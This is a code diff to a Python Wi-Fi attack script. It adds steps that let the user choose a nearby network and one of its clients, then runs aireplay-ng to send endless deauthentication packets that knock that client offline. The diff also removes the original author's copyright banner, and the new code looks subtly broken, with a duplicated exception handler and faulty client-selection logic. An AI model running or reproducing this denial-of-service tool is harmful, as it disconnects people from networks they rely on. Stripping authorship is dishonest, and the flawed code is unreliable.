@@ -42,17 +42,7 @@ def check_for_essid(essid, lst):
     return check_status
 
 # Basic user interface header
-print(r"""______            _     _  ______                 _           _ 
-|  _  \          (_)   | | | ___ \               | |         | |
-| | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
-| | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
-| |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
-|___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
-print("\n****************************************************************")
-print("\n* Copyright of David Bombal, 2021                              *")
-print("\n* https://www.davidbombal.com                                  *")
-print("\n* https://www.youtube.com/davidbombal                          *")
-print("\n****************************************************************")
+print("Ethical Hacking Only")
 
 
 # If the user doesn't run the program with super user privileges, don't allow them to continue.
@@ -133,6 +123,7 @@ discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","-
 
 # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
 # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
+# Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
 try:
     while True:
         # We want to clear the screen before we print the network interfaces.
@@ -169,6 +160,81 @@ try:
             print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
         # We make the script sleep for 1 second before loading the updated list.
         time.sleep(1)
+
+except KeyboardInterrupt:
+    print("\nReady to make choice.")
+
+# Ensure that the input choice is valid.
+while True:
+    # If you don't make a choice from the options available in the list, 
+    # you will be asked to please try again.
+    choice = input("Please select a network to attack (enter its number): ")
+    try:
+        selected_network = active_wireless_networks[int(choice)]
+        break
+    except IndexError:
+        print("Invalid choice. Please try again.")
+
+# To make it easier to work with and read the code, we assign the results to variables.
+hackbssid = selected_network["BSSID"]
+hackchannel = selected_network["channel"].strip()
+
+# Change to the channel we want to perform the DOS attack on. 
+# Monitoring takes place on a different channel and we need to set it to that channel. 
+subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+
+# Loop to select a client from the chosen network.
+try:
+    while True:
+        subprocess.call("clear", shell=True)
+        for file_name in os.listdir():
+            if ".csv" in file_name:
+                with open(file_name) as csv_h:
+                    csv_h.seek(0)
+                    csv_reader = csv.reader(csv_h)
+                    client_count = 0
+                    for row in csv_reader:
+                        if "BSSID" in row or row[0] != hackbssid:
+                            continue
+                        client_count += 1
+                        client_name = row[5].replace("David", "☠️")
+                        print(f"{client_count}\t{row[0]}\t{client_name}")
+        time.sleep(1)
+        client_choice = input("\nPlease select a client to attack (enter its number), or press Enter to re-scan: ")
+
+        # If user wants to re-scan, break from client selection loop.
+        if client_choice == "":
+            break
+
+        # Ensure that the input client choice is valid.
+        try:
+            selected_client = int(client_choice)
+            if selected_client < 1 or selected_client > client_count:
+                print("Invalid choice. Please try again.")
+                continue
+            break
+        except ValueError:
+            print("Invalid input. Please enter a number.")
+
+    # Perform the DOS attack on the selected client.
+    if client_choice != "":
+        selected_client_info = None
+        with open(file_name) as csv_h:
+            csv_h.seek(0)
+            csv_reader = csv.reader(csv_h)
+            for row in csv_reader:
+                if "BSSID" in row or row[0] != hackbssid:
+                    continue
+                client_count -= 1
+                if client_count == 0:
+                    selected_client_info = row
+                    break
+        if selected_client_info:
+            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, "-c", selected_client_info[0], check_wifi_result[int(wifi_interface_choice)] + "mon"])
+            print(f"Deauthentication attack launched against {selected_client_info[5]} ({selected_client_info[0]})")
+        else:
+            print("Selected client information not found.")
+        time.sleep(3)
 
 except KeyboardInterrupt:
     print("\nReady to make choice.")
